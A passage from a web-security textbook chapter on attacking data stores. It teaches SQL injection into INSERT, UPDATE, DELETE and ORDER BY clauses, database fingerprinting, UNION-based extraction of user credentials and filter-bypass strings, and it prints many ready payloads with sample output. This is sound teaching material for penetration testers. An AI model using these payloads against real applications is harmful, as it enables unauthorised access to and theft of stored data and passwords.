then insert the details into the users\ntable with the following statement:\nINSERT INTO users (username, password, ID, privs) VALUES (‘daf’,\n‘secret’, 2248, 1)\nIf the username or password fi eld is vulnerable to SQL injection, an attacker can\ninsert arbitrary data into the table, including his own values for ID and privs.\nHowever, to do so he must ensure that the remainder of the VALUES clause is\ncompleted gracefully. In particular, it must contain the correct number of data\nitems of the correct types. For example, injecting into the username fi eld, the\nattacker can supply the following:\nfoo’, ‘bar’, 9999, 0)--\nThis creates an account with an ID of 9999 and privs of 0. Assuming that the\nprivs fi eld is used to determine account privileges, this may enable the attacker\nto create an administrative user.\nIn some situations, when working completely blind, injecting into an INSERT\nstatement may enable an attacker to extract string data from the application. For\nexample, the attacker could grab the version string of the database and insert\nthis into a fi eld within his own user profi le, which can be displayed back to his\nbrowser in the normal way.\ncc0099..iinndddd 229955 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 296\n296 Chapter 9 n Attacking Data Stores\nTIP When attempting to inject into an INSERT statement, you may not know\nin advance how many parameters are required, or what their types are. In the\npreceding situation, you can keep adding fi elds to the VALUES clause until the\ndesired user account is actually created. For example, when injecting into the\nusername fi eld, you could submit the following:\nfoo’)--\nfoo’, 1)--\nfoo’, 1, 1)--\nfoo’, 1, 1, 1)--\nBecause most databases implicitly cast an integer to a string, an integer\nvalue can be used at each position. In this case the result is an account with\na username of foo and a password of 1, regardless of which order the other\nfi elds are in.\nIf you fi nd that the value 1 is still rejected, you can try the value 2000,\nwhich many databases also implicitly cast to date-based data types.\nWhen you have determined the correct number of fi elds following the injec-\ntion point, on MS-SQL you can add a second arbitrary query and use one of\nthe inference-based techniques described later in this chapter.\nIn Oracle, a subselect query can be issued within an insert query. This\nsubselect query can cause a success or failure of the main query, using the\ninference-based techniques described later.\nTRY IT!\nhttp://mdsec.net/addressbook/12/\nUPDATE Statements\nUPDATE statements are used to modify one or more existing rows of data within\na table. They are often used in functions where a user changes the value of data\nthat already exists — for example, updating her contact information, changing\nher password, or changing the quantity on a line of an order.\nA typical UPDATE statement works much like an INSERT statement, except that\nit usually contains a WHERE clause to tell the database which rows of the table to\nupdate. For example, when a user changes her password, the application might\nperform the following query:\nUPDATE users SET password=’newsecret’ WHERE user = ‘marcus’ and password\n= ‘secret’\nThis query in effect verifi es whether the user’s existing password is correct\nand, if so, updates it with the new value. If the function is vulnerable to SQL\ncc0099..iinndddd 229966 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 297\nChapter 9 n Attacking Data Stores 297\ninjection, an attacker can bypass the existing password check and update the\npassword of the admin user by entering the following username:\nadmin’--\nNOTE Probing for SQL injection vulnerabilities in a remote application\nis always potentially dangerous, because you have no way of knowing in\nadvance quite what action the application will perform using your crafted\ninput. In particular, modifying the WHERE clause in an UPDATE statement can\ncause changes to be made throughout a critical table of the database. For\nexample, if the attack just described had instead supplied the username:\nadmin’ or 1=1--\nthis would cause the application to execute the query:\nUPDATE users SET password=’newsecret’ WHERE user = ‘admin’ or\n1=1\nThis resets the value of every user’s password, because 1 always equals 1!\nBe aware that this risk exists even when you attack an application func-\ntion that does not appear to update any existing data, such as the main login.\nThere have been cases where, following a successful login, the application\nperforms various UPDATE queries using the supplied username. This means\nthat any attack on the WHERE clause may be replicated in these other state-\nments, potentially wreaking havoc within the profi les of all application users.\nYou should ensure that the application owner accepts these unavoidable risks\nbefore attempting to probe for or exploit any SQL injection fl aws. You should\nalso strongly encourage the owner to perform a full database backup before\nyou begin testing.\nTRY IT!\nhttp://mdsec.net/addressbook/27/\nDELETE Statements\nDELETE statements are used to delete one or more rows of data within a table,\nsuch as when users remove an item from their shopping basket or delete a\ndelivery address from their personal details.\nAs with UPDATE statements, a WHERE clause normally is used to tell the data-\nbase which rows of the table to update. User-supplied data is most likely to be\nincorporated into this clause. Subverting the intended WHERE clause can have\ncc0099..iinndddd 229977 88//1199//22001111 1122::0099::3300 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 298\n298 Chapter 9 n Attacking Data Stores\nfar-reaching effects, so the same caution described for UPDATE statements applies\nto this attack.\nFinding SQL Injection Bugs\nIn the most obvious cases, a SQL injection fl aw may be discovered and conclu-\nsively verifi ed by supplying a single item of unexpected input to the application.\nIn other cases, bugs may be extremely subtle and may be diffi cult to distinguish\nfrom other categories of vulnerability or from benign anomalies that do not\npresent a security threat. Nevertheless, you can carry out various steps in an\nordered way to reliably verify the majority of SQL injection fl aws.\nNOTE In your application mapping exercises (see Chapter 4), you should have\nidentifi ed instances where the application appears to be accessing a back-end\ndatabase. All of these need to be probed for SQL injection fl aws. In fact, abso-\nlutely any item of data submitted to the server may be passed to database\nfunctions in ways that are not evident from the user’s perspective and may be\nhandled in an unsafe manner. Therefore, you need to probe every such item\nfor SQL injection vulnerabilities. This includes all URL parameters, cookies,\nitems of POST data, and HTTP headers. In all cases, a vulnerability may exist in\nthe handling of both the name and value of the relevant parameter.\nTIP When you are probing for SQL injection vulnerabilities, be sure to walk\nthrough to completion any multistage processes in which you submit crafted\ninput. Applications frequently gather a collection of data across several\nrequests, and they persist this to the database only after the complete set has\nbeen gathered. In this situation, you will miss many SQL injection vulnerabili-\nties if you only submit crafted data within each individual request and monitor\nthe application’s response to that request.\nInjecting into String Data\nWhen user-supplied string data is incorporated into a SQL query, it is encap-\nsulated within single quotation marks. To exploit any SQL injection fl aw, you\nneed to break out of these quotation marks.\n\nHACK STEPS\n1. Submit a single quotation mark as the item of data you are targeting.\nObserve whether an error occurs, or whether the result differs from the\noriginal in any other way. If a detailed database error message is received,\nconsult the “SQL Syntax and Error Reference” section of this chapter to\nunderstand its meaning.\ncc0099..iinndddd 229988 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 299\nChapter 9 n Attacking Data Stores 299\n2. If an error or other divergent behavior was observed, submit two single\nquotation marks together. Databases use two single quotation marks as\nan escape sequence to represent a literal single quote, so the sequence is\ninterpreted as data within the quoted string rather than the closing string\nterminator. If this input causes the error or anomalous behavior to disap-\npear, the application is probably vulnerable to SQL injection.\n3. As a further verification that a bug is present, you can use SQL concat-\nenator characters to construct a string that is equivalent to some benign\ninput. If the application handles your crafted input in the same way as it\ndoes the corresponding benign input, it is likely to be vulnerable. Each\ntype of database uses different methods for string concatenation. The\nfollowing examples can be injected to construct input that is equivalent to\nFOO in a vulnerable application:\nn Oracle: ‘||’FOO\nn MS-SQL: ‘+’FOO\nn MySQL: ‘ ‘FOO (note the space between the two quotes)\nTIP One way of confi rming that the application is interacting with a back-\nend database is to submit the SQL wildcard character % in a given parameter.\nFor example, submitting this in a search fi eld often returns a large number of\nresults, indicating that the input is being passed into a SQL query. Of course,\nthis does not necessarily indicate that the application is vulnerable — only that\nyou should probe further to identify any actual fl aws.\nTIP While looking for SQL injection using a single quote, keep an eye\nout for any JavaScript errors occurring when your browser processes the\nreturned page. It is fairly common for user-supplied input to be returned\nwithin JavaScript, and an unsanitized single quote will cause an error in the\nJavaScript interpreter, just as it does in the SQL interpreter. The ability to\ninject arbitrary JavaScript into responses allows cross-site scripting attacks, as\ndescribed in Chapter 12.\nInjecting into Numeric Data\nWhen user-supplied numeric data is incorporated into a SQL query, the applica-\ntion may still handle this as string data by encapsulating it within single quotation\nmarks. Therefore, you should always follow the steps described previously for string\ndata. In most cases, however, numeric data is passed directly to the database in\nnumeric form and therefore is not placed within single quotation marks. If none\nof the previous tests points toward the presence of a vulnerability, you can take\nsome other specifi c steps in relation to numeric data.\ncc0099..iinndddd 229999 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 300\n300 Chapter 9 n Attacking Data Stores\n\nHACK STEPS\n1. Try supplying a simple mathematical expression that is equivalent to the\noriginal numeric value. For example, if the original value is 2, try submit-\nting 1+1 or 3-1. If the application responds in the same way, it may be\nvulnerable.\n2. The preceding test is most reliable in cases where you have confirmed\nthat the item being modified has a noticeable effect on the applica-\ntion’s behavior. For example, if the application uses a numeric PageID\nparameter to specify which content should be returned, substituting 1+1\nfor 2 with equivalent results is a good sign that SQL injection is present.\nHowever, if you can place arbitrary input into a numeric parameter with-\nout changing the application’s behavior, the preceding test provides no\nevidence of a vulnerability.\n3. If the first test is successful, you can obtain further evidence of the vulnera-\nbility by using more complicated expressions that use SQL-specific keywords\nand syntax. A good example of this is the ASCII command, which returns\nthe numeric ASCII code of the supplied character. For example, because the\nASCII value of A is 65, the following expression is equivalent to 2 in SQL:\n67-ASCII(‘A’)\n4. The preceding test will not work if single quotes are being filtered.\nHowever, in this situation you can exploit the fact that databases implic-\nitly convert numeric data to string data where required. Hence, because\nthe ASCII value of the character 1 is 49, the following expression is equiv-\nalent to 2 in SQL:\n51-ASCII(1)\nTIP A common mistake when probing an application for defects such as SQL\ninjection is to forget that certain characters have special meaning within HTTP\nrequests. If you want to include these characters within your attack payloads,\nyou must be careful to URL-encode them to ensure that they are interpreted in\nthe way you intend. In particular:\nn & and = are used to join name/value pairs to create the query string and\nthe block of POST data. You should encode them using %26 and %3d,\nrespectively.\nn Literal spaces are not allowed in the query string. If they are submitted,\nthey will effectively terminate the entire string. You should encode them\nusing+ or %20.\nn Because+ is used to encode spaces, if you want to include an actual +\nin your string, you must encode it using %2b. In the previous numeric\nexample, therefore, 1+1 should be submitted as 1%2b1.\ncc0099..iinndddd 330000 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 301\nChapter 9 n Attacking Data Stores 301\nn The semicolon is used to separate cookie fi elds and should be encoded\nusing%3b.\nThese encodings are necessary whether you are editing the parameter’s\nvalue directly from your browser, with an intercepting proxy, or through any\nother means. If you fail to encode problem characters correctly, you may inval-\nidate the entire request or submit data you did not intend to.\nThe steps just described generally are suffi cient to identify the majority\nof SQL injection vulnerabilities, including many of those where no useful results or\nerror information are transmitted back to the browser. In some cases, however,\nmore advanced techniques may be necessary, such as the use of time delays\nto confi rm the presence of a vulnerability. We will describe these techniques\nlater in this chapter.\nInjecting into the Query Structure\nIf user-supplied data is being inserted into the structure of the SQL query itself,\nrather than an item of data within the query, exploiting SQL injection simply\ninvolves directly supplying valid SQL syntax. No “escaping” is required to\nbreak out of any data context.\nThe most common injection point within the SQL query structure is within an\nORDER BY clause. The ORDER BY keyword takes a column name or number and\norders the result set according to the values in that column. This functionality\nis frequently exposed to the user to allow sorting of a table within the browser.\nA typical example is a sortable table of books that is retrieved using this query:\nSELECT author, title, year FROM books WHERE publisher = ‘Wiley’ ORDER BY\ntitle ASC\nIf the column name title in the ORDER BY is specifi ed by the user, it is not\nnecessary to use a single quote. The user-supplied data already directly modi-\nfi es the structure of the SQL query.\nTIP In some rarer cases, user-supplied input may specify a column name\nwithin a WHERE clause. Because these are also not encapsulated in single\nquotes, a similar issue occurs. The authors have also encountered applications\nwhere the table name has been a user-supplied parameter. Finally, a surpris-\ning number of applications expose the sort order keyword (ASC or DESC) to be\nspecifi ed by the user, perhaps believing that this has no consequence for SQL\ninjection attacks.\nFinding SQL injection in a column name can be diffi cult. If a value is sup-\nplied that is not a valid column name, the query results in an error. This means\nthat the response will be the same regardless of whether the attacker submits a\ncc0099..iinndddd 330011 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 302\n302 Chapter 9 n Attacking Data Stores\npath traversal string, single quote, double quote, or any other arbitrary string.\nTherefore, common techniques for both automated fuzzing and manual testing\nare liable to overlook the vulnerability. The standard test strings for numerous\nkinds of vulnerabilities will all cause the same response, which may not itself\ndisclose the nature of the error.\nNOTE Some conventional SQL injection defenses described later in this\nchapter cannot be implemented for user-specifi ed column names. Using\nprepared statements or escaping single quotes will not prevent this type of\nSQL injection. As a result, this vector is a key one to look out for in modern\napplications.\n\nHACK STEPS\n1. Make a note of any parameters that appear to control the order or field\ntypes within the results that the application returns.\n2. Make a series of requests supplying a numeric value in the parameter\nvalue, starting with the number 1 and incrementing it with each subse-\nquent request:\nn If changing the number in the input affects the ordering of the results,\nthe input is probably being inserted into an ORDER BY clause. In SQL,\nORDER BY 1 orders by the fi rst column. Increasing this number to 2\nshould then change the display order of data to order by the second\ncolumn. If the number supplied is greater than the number of columns\nin the result set, the query should fail. In this situation, you can confi rm\nthat further SQL can be injected by checking whether the results order\ncan be reversed, using the following:\n1 ASC --\n1 DESC --\nn If supplying the number 1 causes a set of results with a column contain-\ning a 1 in every row, the input is probably being inserted into the name\nof a column being returned by the query. For example:\nSELECT 1,title,year FROM books WHERE publisher=’Wiley’\nNOTE Exploiting SQL injection in an ORDER BY clause is signifi cantly differ-\nent from most other cases. A database will not accept a UNION,WHERE,OR, or\nAND keyword at this point in the query. Generally exploitation requires the\nattacker to specify a nested query in place of the parameter, such as replac-\ning the column name with (select 1 where <<condition>> or 1/0=0),\nthereby leveraging the inference techniques described later in this chapter.\nFor databases that support batched queries such as MS-SQL, this can be the\nmost effi cient option.\ncc0099..iinndddd 330022 88//1199//22001111 1122::0099::3300 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 303\nChapter 9 n Attacking Data Stores 303\nFingerprinting the Database\nMost of the techniques described so far are effective against all the common\ndatabase platforms, and any divergences have been accommodated through\nminor adjustments to syntax. However, as we begin to look at more advanced\nexploitation techniques, the differences between platforms become more signifi -\ncant, and you will increasingly need to know which type of back-end database\nyou are dealing with.\nYou have already seen how you can extract the version string of the major\ndatabase types. Even if this cannot be done for some reason, it is usually pos-\nsible to fi ngerprint the database using other methods. One of the most reliable\nis the different means by which databases concatenate strings. In a query where\nyou control some item of string data, you can supply a particular value in one\nrequest and then test different methods of concatenation to produce that string.\nWhen the same results are obtained, you have probably identifi ed the type of\ndatabase being used. The following examples show how the string services\ncould be constructed on the common types of database:\nn Oracle:‘serv’||’ices’\nn MS-SQL:‘serv’+’ices’\nn MySQL:‘serv’ ‘ices’ (note the space)\nIf you are injecting into numeric data, the following attack strings can be\nused to fi ngerprint the database. Each of these items evaluates to 0 on the target\ndatabase and generates an error on the other databases:\nn Oracle:BITAND(1,1)-BITAND(1,1)\nn MS-SQL:@@PACK_RECEIVED-@@PACK_RECEIVED\nn MySQL:CONNECTION_ID()-CONNECTION_ID()\nNOTE The MS-SQL and Sybase databases share a common origin, so they\nhave many similarities in relation to table structure, global variables, and stored\nprocedures. In practice, the majority of the attack techniques against MS-SQL\ndescribed in later sections will work in an identical way against Sybase.\nA further point of interest when fi ngerprinting databases is how MySQL\nhandles certain types of inline comments. If a comment begins with an exclama-\ntion point followed by a database version string, the contents of the comment\nare interpreted as actual SQL, provided that the version of the actual database\nis equal to or later than that string. Otherwise, the contents are ignored and\ntreated as a comment. Programmers can use this facility much like preproces-\nsor directives in C, enabling them to write different code that will be processed\ncc0099..iinndddd 330033 88//1199//22001111 1122::0099::3300 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 304\n304 Chapter 9 n Attacking Data Stores\nconditionally upon the database version being used. An attacker also can use this\nfacility to fi ngerprint the exact version of the database. For example, injecting\nthe following string causes the WHERE clause of a SELECT statement to be false if\nthe MySQL version in use is greater than or equal to 3.23.02:\n/*!32302 and 1=0*/\nThe UNION Operator\nThe UNION operator is used in SQL to combine the results of two or more SELECT\nstatements into a single result set. When a web application contains a SQL injec-\ntion vulnerability that occurs in a SELECT statement, you can often employ the\nUNION operator to perform a second, entirely separate query, and combine its\nresults with those of the fi rst. If the results of the query are returned to your\nbrowser, this technique can be used to easily extract arbitrary data from within\nthe database. UNION is supported by all major DBMS products. It is the quickest\nway to retrieve arbitrary information from the database in situations where\nquery results are returned directly.\nRecall the application that enabled users to search for books based on author,\ntitle, publisher, and other criteria. Searching for books published by Wiley causes\nthe application to perform the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’\nSuppose that this query returns the following set of results:\n\nAUTHOR TITLE YEAR\nLitchfi eld The Database Hacker’s Handbook 2005\nAnley The Shellcoder’s Handbook 2007\nYou saw earlier how an attacker could supply crafted input to the search\nfunction to subvert the query’s WHERE clause and therefore return all the books\nheld within the database. A far more interesting attack would be to use the\nUNION operator to inject a second SELECT query and append its results to those\nof the fi rst. This second query can extract data from a different database table.\nFor example, entering the search term:\nWiley’ UNION SELECT username,password,uid FROM users--\ncauses the application to perform the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’\nUNION SELECT username,password,uid FROM users--’\ncc0099..iinndddd 330044 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 305\nChapter 9 n Attacking Data Stores 305\nThis returns the results of the original search followed by the contents of\nthe users table:\n\nAUTHOR TITLE YEAR\nLitchfi eld The Database Hacker’s Handbook 2005\nAnley The Shellcoder’s Handbook 2007\nadmin r00tr0x 0\ncliff Reboot 1\nNOTE When the results of two or more SELECT queries are combined using\nthe UNION operator, the column names of the combined result set are the\nsame as those returned by the fi rst SELECT query. As shown in the preceding\ntable, usernames appear in the author column, and passwords appear in the\ntitle column. This means that when the application processes the results\nof the modifi ed query, it has no way of detecting that the data returned has\noriginated from a different table.\nThis simple example demonstrates the potentially huge power of the UNION\noperator when employed in a SQL injection attack. However, before it can be\nexploited in this way, two important provisos need to be considered:\nn When the results of two queries are combined using the UNION operator,\nthe two result sets must have the same structure. In other words, they must\ncontain the same number of columns, which have the same or compatible\ndata types, appearing in the same order.\nn To inject a second query that will return interesting results, the attacker\nneeds to know the name of the database table that he wants to target, and\nthe names of its relevant columns.\nLet’s look a little deeper at the fi rst of these provisos. Suppose that the attacker\nattempts to inject a second query that returns an incorrect number of columns.\nHe supplies this input:\nWiley’ UNION SELECT username,password FROM users--\nThe original query returns three columns, and the injected query returns\nonly two columns. Hence, the database returns the following error:\nORA-01789: query block has incorrect number of result columns\nSuppose instead that the attacker attempts to inject a second query whose\ncolumns have incompatible data types. He supplies this input:\nWiley’ UNION SELECT uid,username,password FROM users--\ncc0099..iinndddd 330055 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 306\n306 Chapter 9 n Attacking Data Stores\nThis causes the database to attempt to combine the password column from the\nsecond query (which contains string data) with the year column from the fi rst\nquery (which contains numeric data). Because string data cannot be converted\ninto numeric data, this causes an error:\nORA-01790: expression must have same datatype as corresponding expression\nNOTE The error messages shown here are for Oracle. The equivalent\nmessages for other databases are listed in the later section “SQL Syntax and\nError Reference.”\nIn many real-world cases, the database error messages shown are trapped\nby the application and are not be returned to the user’s browser. It may appear,\ntherefore, that in attempting to discover the structure of the fi rst query, you are\nrestricted to pure guesswork. However, this is not the case. Three important\npoints mean that your task usually is easy:\nn For the injected query to be capable of being combined with the fi rst, it is\nnot strictly necessary that it contain the same data types. Rather, they must\nbe compatible. In other words, each data type in the second query must\neither be identical to the corresponding type in the fi rst or be implicitly\nconvertible to it. You have already seen that databases implicitly convert\na numeric value to a string value. In fact, the value NULL can be converted\nto any data type. Hence, if you do not know the data type of a particular\nfi eld, you can simply SELECT NULL for that fi eld.\nn In cases where the application traps database error messages, you can\neasily determine whether your injected query was executed. If it was,\nadditional results are added to those returned by the application from its\noriginal query. This enables you to work systematically until you discover\nthe structure of the query you need to inject.\nn In most cases, you can achieve your objectives simply by identifying a\nsingle fi eld within the original query that has a string data type. This is\nsuffi cient for you to inject arbitrary queries that return string-based data\nand retrieve the results, enabling you to systematically extract any desired\ndata from the database.\n\nHACK STEPS\nYour fi rst task is to discover the number of columns returned by the original\nquery being executed by the application. You can do this in two ways:\n1. You can exploit the fact that NULL can be converted to any data type to\nsystematically inject queries with different numbers of columns until your\ninjected query is executed. For example:\ncc0099..iinndddd 330066 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 307\nChapter 9 n Attacking Data Stores 307\n‘ UNION SELECT NULL--\n‘ UNION SELECT NULL, NULL--\n‘ UNION SELECT NULL, NULL, NULL--\nWhen your query is executed, you have determined the number of col-\numns required. If the application doesn’t return database error messages,\nyou can still tell when your injected query was successful. An additional\nrow of data will be returned, containing either the word NULL or an empty\nstring. Note that the injected row may contain only empty table cells and so\nmay be hard to see when rendered as HTML. For this reason it is preferable\nto look at the raw response when performing this attack.\n2. Having identified the required number of columns, your next task is to\ndiscover a column that has a string data type so that you can use this to\nextract arbitrary data from the database. You can do this by injecting a\nquery containing NULLs, as you did previously, and systematically replac-\ning each NULL with a. For example, if you know that the query must return\nthree columns, you can inject the following:\n‘ UNION SELECT ‘a’, NULL, NULL--\n‘ UNION SELECT NULL, ‘a’, NULL--\n‘ UNION SELECT NULL, NULL, ‘a’--\nWhen your query is executed, you see an additional row of data containing the\nvaluea. You can then use the relevant column to extract data from the database.\nNOTE In Oracle databases, every SELECT statement must include a FROM\nattribute, so injecting UNION SELECT NULL produces an error regardless of\nthe number of columns. You can satisfy this requirement by selecting from the\nglobally accessible table DUAL. For example:\n‘ UNION SELECT NULL FROM DUAL--\nWhen you have identifi ed the number of columns required in your injected\nquery, and have found a column that has a string data type, you are in a position\nto extract arbitrary data. A simple proof-of-concept test is to extract the version\nstring of the database, which can be done on any DBMS. For example, if there\nare three columns, and the fi rst column can take string data, you can extract\nthe database version by injecting the following query on MS-SQL and MySQL:\n‘ UNION SELECT @@version,NULL,NULL--\nInjecting the following query achieves the same result on Oracle:\n‘ UNION SELECT banner,NULL,NULL FROM v$version--\nIn the example of the vulnerable book search application, we can use this\nstring as a search term to retrieve the version of the Oracle database:\ncc0099..iinndddd 330077 88//1199//22001111 1122::0099::3311 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 308\n308 Chapter 9 n Attacking Data Stores\n\nAUTHOR TITLE YEAR\nCORE 9.2.0.1.0 Production\nNLSRTL Version 9.2.0.1.0 - Production\nOracle9i Enterprise Edition Release 9.2.0.1.0 - Production\nPL/SQL Release 9.2.0.1.0 - Production\nTNS for 32-bit Windows: Version 9.2.0.1.0 - Production\nOf course, even though the database’s version string may be interesting, and\nmay enable you to research vulnerabilities with the specifi c software being used,\nin most cases you will be more interested in extracting actual data from the\ndatabase. To do this, you typically need to address the second proviso described\nearlier. That is, you need to know the name of the database table you want to\ntarget and the names of its relevant columns.\nExtracting Useful Data\nTo extract useful data from the database, normally you need to know the names\nof the tables and columns containing the data you want to access. The main\nenterprise DBMSs contain a rich amount of database metadata that you can\nquery to discover the names of every table and column within the database.\nThe methodology for extracting useful data is the same in each case; however,\nthe details differ on different database platforms.\nExtracting Data with UNION\nLet’s look at an attack being performed against an MS-SQL database, but use a\nmethodology that will work on all database technologies. Consider an address\nbook application that allows users to maintain a list of contacts and query and\nupdate their details. When a user searches her address book for a contact named\nMatthew, her browser posts the following parameter:\nName=Matthew\nand the application returns the following results:\n\nNAME E-MAIL\nMatthew Adamson handytrick@gmail.com\ncc0099..iinndddd 330088 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 309\nChapter 9 n Attacking Data Stores 309\nTRY IT!\nhttp://mdsec.net/addressbook/32/\nFirst, we need to determine the required number of columns. Testing for a\nsingle column results in an error message:\nName=Matthew’%20union%20select%20null--\nAll queries combined using a UNION, INTERSECT or EXCEPT operator must\nhave an equal number of expressions in their target lists.\nWe add a second NULL, and the same error occurs. So we continue adding NULLs\nuntil our query is executed, generating an additional item in the results table:\nName=Matthew’%20union%20select%20null,null,null,null,null--\n\nNAME E-MAIL\nMatthew Adamson handytrick@gmail.com\n[empty] [empty]\nWe now verify that the fi rst column in the query contains string data:\nName=Matthew’%20union%20select%20’a’,null,null,null,null--\n\nNAME E-MAIL\nMatthew Adamson handytrick@gmail.com\na\nThe next step is to fi nd out the names of the database tables and columns that\nmay contain interesting information. We can do this by querying the metadata\ntable information_schema.columns, which contains details of all tables and\ncolumn names within the database. These can be retrieved with this query:\nName=Matthew’%20union%20select%20table_name,column_name,null,null,\nnull%20from%20information_schema.columns--\ncc0099..iinndddd 330099 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 310\n310 Chapter 9 n Attacking Data Stores\n\nNAME E-MAIL\nMatthew Adamson handytrick@gmail.com\nshop_items price\nshop_items prodid\nshop_items prodname\naddr_book contactemail\naddr_book contactname\nusers username\nusers password\nHere, the users table is an obvious place to begin extracting data. We could\nextract data from the users table using this query:\nName=Matthew’%20UNION%20select%20username,password,null,null,null%20\nfrom%20users--\n\nNAME E-MAIL\nMatthew Adamson handytrick@gmail.com\nadministrator fme69\ndev uber\nmarcus 8pinto\nsmith twosixty\njlo 6kdown\nTIP The information_schema is supported by MS-SQL, MySQL, and many\nother databases, including SQLite and Postgresql. It is designed to hold data-\nbase metadata, making it a primary target for attackers wanting to examine\nthe database. Note that Oracle doesn’t support this schema. When targeting\nan Oracle database, the attack would be identical in every other way. However,\nyou would use the query SELECT table_name,column_name FROM all_tab_\ncolumns to retrieve information about tables and columns in the database.\n(You would use the user_tab_columns table to focus on the current database\nonly.) When analyzing large databases for points of attack, it is usually best to\nlook directly for interesting column names rather than tables. For instance:\nSELECT table_name,column_name FROM information_schema.columns where\ncolumn_name LIKE ‘%PASS%’\ncc0099..iinndddd 331100 88//1199//22001111 1122::0099::3311 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 311\nChapter 9 n Attacking Data Stores 311\nTIP When multiple columns are returned from a target table, these can be\nconcatenated into a single column. This makes retrieval more straightforward,\nbecause it requires identifi cation of only a single varchar fi eld in the original\nquery:\nn Oracle:SELECT table_name||’:’||column_name FROM\nall_tab_columns\nn MS-SQL:SELECT table_name+’:’+column_name from information_\nschema.columns\nn MySQL:SELECT CONCAT(table_name,’:’,column_name) from\ninformation_schema.columns\nBypassing Filters\nIn some situations, an application that is vulnerable to SQL injection may imple-\nment various input fi lters that prevent you from exploiting the fl aw without\nrestrictions. For example, the application may remove or sanitize certain characters\nor may block common SQL keywords. Filters of this kind are often vulnerable\nto bypasses, so you should try numerous tricks in this situation.\nAvoiding Blocked Characters\nIf the application removes or encodes some characters that are often used in\nSQL injection attacks, you may still be able to perform an attack without these:\nn The single quotation mark is not required if you are injecting into a numeric\ndata fi eld or column name. If you need to introduce a string into your\nattack payload, you can do this without needing quotes. You can use\nvarious string functions to dynamically construct a string using the ASCII\ncodes for individual characters. For example, the following two queries\nfor Oracle and MS-SQL, respectively, are the equivalent of select ename,\nsal from emp where ename=’marcus’:\nSELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||\nCHR(114)||CHR(99)||CHR(117)||CHR(115)\nSELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)\n+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)\nn If the comment symbol is blocked, you can often craft your injected data\nsuch that it does not break the syntax of the surrounding query, even\nwithout using this. For example, instead of injecting:\n‘ or 1=1--\nyou can inject:\n‘ or ‘a’=’a\ncc0099..iinndddd 331111 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 312\n312 Chapter 9 n Attacking Data Stores\nn When attempting to inject batched queries into an MS-SQL database,\nyou do not need to use the semicolon separator. Provided that you fi x\nthe syntax of all queries in the batch, the query parser will interpret them\ncorrectly, whether or not you include a semicolon.\nTRY IT!\nhttp://mdsec.net/addressbook/71/\nhttp://mdsec.net/addressbook/76/\nCircumventing Simple Validation\nSome input validation routines employ a simple blacklist and either block or\nremove any supplied data that appears on this list. In this instance, you should\ntry the standard attacks, looking for common defects in validation and canoni-\ncalization mechanisms, as described in Chapter 2. For example, if the SELECT\nkeyword is being blocked or removed, you can try the following bypasses:\nSeLeCt\n%00SELECT\n\nSELSELECTECT\n%53%45%4c%45%43%54\n%2553%2545%254c%2545%2543%2554\nTRY IT!\nhttp://mdsec.net/addressbook/58/\nhttp://mdsec.net/addressbook/62/\nUsing SQL Comments\nYou can insert inline comments into SQL statements in the same way as for C++,\nby embedding them between the symbols /* and */. If the application blocks\nor strips spaces from your input, you can use comments to simulate whitespace\nwithin your injected data. For example:\nSELECT/*foo*/username,password/*foo*/FROM/*foo*/users\nIn MySQL, comments can even be inserted within keywords themselves,\nwhich provides another means of bypassing some input validation fi lters while\npreserving the syntax of the actual query. For example:\nSEL/*foo*/ECT username,password FR/*foo*/OM users\ncc0099..iinndddd 331122 88//1199//22001111 1122::0099::3311 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 313\nChapter 9 n Attacking Data Stores 313\nExploiting Defective Filters\nInput validation routines often contain logic fl aws that you can exploit to smuggle\nblocked input past the fi lter. These attacks often exploit the ordering of multiple\nvalidation steps, or the failure to apply sanitization logic recursively. Some\nattacks of this kind are described in Chapter 11.\nTRY IT!\nhttp://mdsec.net/addressbook/67/\nSecond-Order SQL Injection\nA particularly interesting type of fi lter bypass arises in connection with second-\norder SQL injection. Many applications handle data safely when it is fi rst inserted\ninto the database. Once data is stored in the database, it may later be processed\nin unsafe ways, either by the application itself or by other back-end processes.\nMany of these are not of the same quality as the primary Internet-facing appli-\ncation but have high-privileged database accounts.\nIn some applications, input from the user is validated on arrival by escaping\na single quote. In the original book search example, this approach appears to\nbe effective. When the user enters the search term O’Reilly, the application\nmakes the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘O’’Reilly’\nHere, the single quotation mark supplied by the user has been converted into\ntwo single quotation marks. Therefore, the item passed to the database has the\nsame literal signifi cance as the original expression the user entered.\nOne problem with the doubling-up approach arises in more complex situa-\ntions where the same item of data passes through several SQL queries, being\nwritten to the database and then read back more than once. This is one example\nof the shortcomings of simple inputvalidation as opposed to boundaryvalidation,\nas described in Chapter 2.\nRecall the application that allowed users to self-register and contained a SQL\ninjection fl aw in an INSERT statement. Suppose that developers attempt to fi x\nthe vulnerability by doubling up any single quotation marks that appear within\nuser data. Attempting to register the username foo’ results in the following\nquery, which causes no problems 